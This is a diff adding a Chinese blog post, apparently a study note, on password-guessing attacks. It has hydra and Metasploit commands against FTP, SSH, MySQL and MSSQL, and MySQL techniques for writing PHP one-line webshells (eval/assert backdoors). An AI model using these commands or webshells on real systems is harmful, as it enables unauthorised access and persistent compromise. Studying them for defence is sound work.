@@ -1,0 +1,1279 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>远程弱口令攻击学习 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,弱口令">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了弱口令攻击的一些方式！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">远程弱口令攻击学习</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+      远程弱口令攻击学习
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年2月26日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：826字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：3分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/" class="leancloud_visitors" data-flag-title="远程弱口令攻击学习">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了弱口令攻击的一些方式！</p>
+<a id="more"></a>
+
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ftp </span><br></pre></td></tr></table></figure>
+
+<p>参数解释：</p>
+<ol>
+<li><p><code>-l root</code>     指定爆破账号为root</p>
+</li>
+<li><p><code>-w 10</code>     指定每个线程的回应时间为10S</p>
+</li>
+<li><p><code>-P pwd.txt</code> 指定密码字典为pwd.txt</p>
+</li>
+<li><p><code>-t 10</code>      指定爆破线程为10个</p>
+</li>
+<li><p><code>-v</code>        指定显示爆破过程</p>
+</li>
+<li><p><code>-f</code>        查找到第一个可以使用的ID和密码的时候停止破解</p>
+</li>
+</ol>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>可以先使用<code>auxiliary/scanner/ftp/ftp_version</code>对版本进行探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.0.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200228151826.png" style="zoom:80%;">
+
+<p>可以看到探测出是开放的，并获取到了ftp的banner信息</p>
+<p>破解密码可以使用<code>auxiliary/scanner/ftp/ftp_login</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/Desktop/pass.txt</span><br><span class="line"><span class="built_in">set</span> USERPASS_FILE /root/Desktop/name.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="hydra-1"><a href="#hydra-1" class="headerlink" title="hydra"></a>hydra</h3><p>同样和ftp类似</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ssh</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h3><p>可以用<code>auxiliary/scanner/ssh/ssh_enumusers</code>这个模块枚举用户</p>
+<p>可以用<code>auxiliary/scanner/ssh/ssh_login</code>这个暴力破解</p>
+<p>用<code>auxiliary/scanner/ssh/ssh_version</code>探测版本</p>
+<p>用<code>auxiliary/scanner/ssh/ssh_login_pubkey</code>进行公钥破解</p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="hydra-2"><a href="#hydra-2" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mysql</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf-2"><a href="#msf-2" class="headerlink" title="msf"></a>msf</h3><p>使用<code>auxiliary/scanner/mysql/mysql_version</code>可以探测版本</p>
+<p>使用<code>auxiliary/admin/mysql/mysql_enum</code>可以获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值</p>
+<p>使用<code>auxiliary/scanner/mysql/mysql_login</code>破解</p>
+<p>使用<code>auxiliary/scanner/mysql/mysql_hashdump</code>进行mysql哈希值枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>auxiliary/admin/mysql/mysql_sql</code>可以连接mysql类似于sqlmap里的–sql-shell</p>
+<p>使用<code>auxiliary/scanner/mysql/mysql_schemadump</code>可以将数据库导出到本地</p>
+<p>使用<code>auxiliary/scanner/mysql/mysql_file_enum</code>进行文件枚举</p>
+<p>使用<code>auxiliary/scanner/mysql/mysql_writable_dirs</code>进行可写目录枚举</p>
+<h3 id="mysql攻击方法"><a href="#mysql攻击方法" class="headerlink" title="mysql攻击方法"></a>mysql攻击方法</h3><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为<code>config.php</code>、<code>web.config</code>、<code>conn.asp</code>、<code>db.php/asp</code>、<code>jdbc.properties</code>、<code>sysconfig.properties</code>、<code>JBOSS_HOME\docs\examples\jca\XXXX-ds.xml</code>等等。</p>
+<p>使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件</p>
+<h4 id="mysql写马"><a href="#mysql写马" class="headerlink" title="mysql写马"></a>mysql写马</h4><p>前提需要知道网站的真实物理路径，例如呼求偶真实路径<code>D:\work\WWW</code>，则可以通过执行以下查询，来获取一句话后门文件<code>cmd.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;INTO OUTFILE &#39;D:&#x2F;work&#x2F;WWW&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p>当然我们可以用16进制形式写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;十六进制字符串不用0x&#39;) into dumpfile &#39;D:&#x2F;WEB&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>general_log_file写马</strong></p>
+<p>（1）查看genera文件配置情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;%genera%&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>（2）关闭general_log</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=off;</span><br></pre></td></tr></table></figure>
+
+<p>（3）通过general_log选项来获取webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/WWW/cmd.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在查询中执行语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Shell为cmd.php，一句话后门，密码为cmd。</p>
+<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><h3 id="hydra-3"><a href="#hydra-3" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mssql</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf-3"><a href="#msf-3" class="headerlink" title="msf"></a>msf</h3><p>使用<code>auxiliary/scanner/mssql/mssql_login</code>破解密码</p>
+<h2 id="pcanywhere-vnc-3389"><a href="#pcanywhere-vnc-3389" class="headerlink" title="pcanywhere,vnc,3389"></a>pcanywhere,vnc,3389</h2><p>同样强大的hydra也支持以上三种，不过最新版本的hydra好像不支持3389的爆破了，只需改变服务类型就行</p>
+<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>kali的<code>/usr/share/wordlists</code>目录下有很多</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80943541">https://blog.csdn.net/Fly_hps/article/details/80943541</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/>http://www.moonback.xyz/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-03-24T11:53:22+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年3月24日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>弱口令</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=远程弱口令攻击学习 - 明月归的小站&summary=本篇博客主要介绍了弱口令攻击的一些方式！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=远程弱口令攻击学习 - 明月归的小站&summary=本篇博客主要介绍了弱口令攻击的一些方式！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2020/02/26/%E7%9F%A5%E8%AF%86%E7%82%B9/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/&title=远程弱口令攻击学习 - 明月归的小站&summary=本篇博客主要介绍了弱口令攻击的一些方式！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/03/04/%E7%9F%A5%E8%AF%86%E7%82%B9/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>linux相关内容学习</p>
+                <p class='content'>本篇博客主要介绍了和linux用户及权限的相关内容，权限的东西经常弄混，记一下！
+
+
+Linux权限我们可以用ls -l查看详细信息
+linux下的权限可分为三种：
+
+r表示读，数字表示为4。对...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/02/26/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/metasploit%E5%AD%A6%E4%B9%A0/'>
+                <p class='title'>metasploit学习<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了msf的相关内容！
+
+
+什么是msf?msf全称Metasploit Framework，它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新，是目前世界...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp"><span class="toc-text">ftp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra"><span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf"><span class="toc-text">msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra-1"><span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-1"><span class="toc-text">msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra-2"><span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-2"><span class="toc-text">msf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-text">mysql攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E5%86%99%E9%A9%AC"><span class="toc-text">mysql写马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql"><span class="toc-text">mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra-3"><span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-3"><span class="toc-text">msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pcanywhere-vnc-3389"><span class="toc-text">pcanywhere,vnc,3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8"><span class="toc-text">字典</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", 